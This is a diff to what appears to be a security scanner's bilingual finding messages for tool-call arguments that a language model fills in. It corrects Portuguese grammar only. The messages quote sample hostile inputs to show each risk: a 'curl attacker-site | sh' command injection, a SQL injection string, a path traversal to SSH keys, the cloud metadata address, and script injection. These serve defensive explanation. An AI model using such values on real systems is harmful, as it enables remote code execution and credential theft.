@@ -68,10 +68,11 @@ def _llm_params(kind):
 
 
 # APP014: argumento que o modelo preenche ao chamar uma ferramenta (MCP, AI SDK, LangChain, tool calling). Por tipo de
-# sink: (onde chega pt, en, o que acontece pt, en, como corrigir pt, en, resumo do impacto pt, en). "_any" é a variante
-# em que a ferramenta recebe o valor inteiro (o comando, o caminho): é o desenho dela, e o risco é o alcance.
+# sink: (onde chega pt, com a preposição ("à página", não "a a página"), en, o que acontece pt, en, como corrigir pt,
+# en, resumo do impacto pt, en). "_any" é a variante em que a ferramenta recebe o valor inteiro (o comando, o caminho):
+# é o desenho dela, e o risco é o alcance.
 _TOOL_SINK = {
-    "shell": ("um comando de shell", "a shell command",
+    "shell": ("a um comando de shell", "a shell command",
               "Um valor como \"x; curl site-do-atacante | sh\" vira um segundo comando rodando na máquina onde a ferramenta "
               "roda, com os arquivos e as chaves dela.",
               "A value such as \"x; curl attacker-site | sh\" becomes a second command running on the machine where the tool "
@@ -81,7 +82,7 @@ _TOOL_SINK = {
               "Run the program with an argument list and no shell (execFile, spawn without a shell, subprocess.run([...])) "
               "and accept only values from a fixed list.",
               "rodar comandos na máquina onde ela está instalada", "run commands on the machine where it is installed"),
-    "shell_any": ("um comando de shell", "a shell command",
+    "shell_any": ("a um comando de shell", "a shell command",
                   "A ferramenta roda o comando inteiro que o modelo escrever: uma instrução escondida vira um comando na "
                   "máquina onde a ferramenta roda.",
                   "The tool runs whatever command the model writes: one hidden instruction becomes a command on the machine "
@@ -91,7 +92,7 @@ _TOOL_SINK = {
                   "If the tool must run commands, accept only commands from a fixed list, run them without a shell, and ask "
                   "the user to confirm each one.",
                   "rodar comandos na máquina onde ela está instalada", "run commands on the machine where it is installed"),
-    "code": ("eval/exec", "eval/exec",
+    "code": ("a eval/exec", "eval/exec",
              "O texto roda como código na máquina onde a ferramenta roda, com os arquivos e as chaves dela.",
              "The text runs as code on the machine where the tool runs, with its files and keys.",
              "Não execute o valor: leia o dado que você espera (JSON.parse, json.loads, ast.literal_eval) ou mapeie para "
@@ -99,19 +100,19 @@ _TOOL_SINK = {
              "Do not run the value: parse the data you expect (JSON.parse, json.loads, ast.literal_eval) or map it to "
              "functions from a fixed list.",
              "rodar código na máquina onde ela está instalada", "run code on the machine where it is installed"),
-    "template": ("um template", "a template",
+    "template": ("a um template", "a template",
                  "Sintaxe de template no valor roda como código na máquina onde a ferramenta roda.",
                  "Template syntax in the value runs as code on the machine where the tool runs.",
                  "Use um template fixo e passe o valor como variável.", "Use a fixed template and pass the value as a variable.",
                  "rodar código na máquina onde ela está instalada", "run code on the machine where it is installed"),
-    "sql": ("uma consulta SQL", "a SQL query",
+    "sql": ("a uma consulta SQL", "a SQL query",
             "Um valor como ' OR '1'='1 muda a consulta e pode ler, alterar ou apagar dados do banco.",
             "A value such as ' OR '1'='1 changes the query and can read, change or delete data in the database.",
             "Passe o valor como parâmetro da consulta (?, %s, $1) e use um usuário de banco só com as permissões de que a "
             "ferramenta precisa.",
             "Pass the value as a query parameter (?, %s, $1) and use a database user with only the permissions the tool needs.",
             "ler, alterar ou apagar dados do banco", "read, change or delete data in the database"),
-    "path": ("um caminho de arquivo", "a file path",
+    "path": ("a um caminho de arquivo", "a file path",
              "Um valor como ../../.ssh/id_rsa sai da pasta que a ferramenta deveria usar e lê ou sobrescreve qualquer arquivo "
              "que ela alcança, chaves incluídas.",
              "A value such as ../../.ssh/id_rsa leaves the folder the tool is meant to use and reads or overwrites any file it "
@@ -122,7 +123,7 @@ _TOOL_SINK = {
              "Path.resolve().is_relative_to), or keep only the file name (basename).",
              "ler ou sobrescrever arquivos fora da pasta dela, chaves incluídas",
              "read or overwrite files outside its folder, keys included"),
-    "path_any": ("um caminho de arquivo", "a file path",
+    "path_any": ("a um caminho de arquivo", "a file path",
                  "A ferramenta abre qualquer arquivo que o modelo indicar, não só os que ela deveria usar: dá para ler ou "
                  "sobrescrever ~/.ssh, .env e as chaves de quem instalou.",
                  "The tool opens any file the model names, not only the ones it is meant to use: it can read or overwrite "
@@ -133,7 +134,7 @@ _TOOL_SINK = {
                  "Path.resolve().is_relative_to).",
                  "ler ou sobrescrever qualquer arquivo da máquina, chaves incluídas",
                  "read or overwrite any file on the machine, keys included"),
-    "url": ("um endereço que o servidor busca", "a URL the server fetches",
+    "url": ("a um endereço que o servidor busca", "a URL the server fetches",
             "O modelo escolhe o endereço: a ferramenta pode ser apontada para a sua rede local, para serviços em localhost ou "
             "para o endereço de metadados da nuvem (169.254.169.254), que entrega credenciais.",
             "The model picks the address: the tool can be pointed at your local network, at services on localhost or at the "
@@ -142,12 +143,12 @@ _TOOL_SINK = {
             "buscar.",
             "Allow only the domains the tool needs and block private, local and metadata addresses before fetching.",
             "chamar endereços internos e o serviço de metadados da nuvem", "call internal addresses and the cloud metadata service"),
-    "deserialize": ("pickle ou YAML inseguro", "pickle or unsafe YAML",
+    "deserialize": ("a pickle ou YAML inseguro", "pickle or unsafe YAML",
                     "Carregar esse conteúdo pode rodar código na máquina onde a ferramenta roda.",
                     "Loading that content can run code on the machine where the tool runs.",
                     "Use JSON ou yaml.safe_load para o que a ferramenta recebe.", "Use JSON or yaml.safe_load for what the tool receives.",
                     "rodar código na máquina onde ela está instalada", "run code on the machine where it is installed"),
-    "html": ("a página como HTML", "the page as HTML",
+    "html": ("à página como HTML", "the page as HTML",
              "Um <script> no valor roda no navegador de quem vê a página.",
              "A <script> in the value runs in the browser of whoever sees the page.",
              "Mostre como texto ou limpe com DOMPurify.sanitize antes de inserir.",
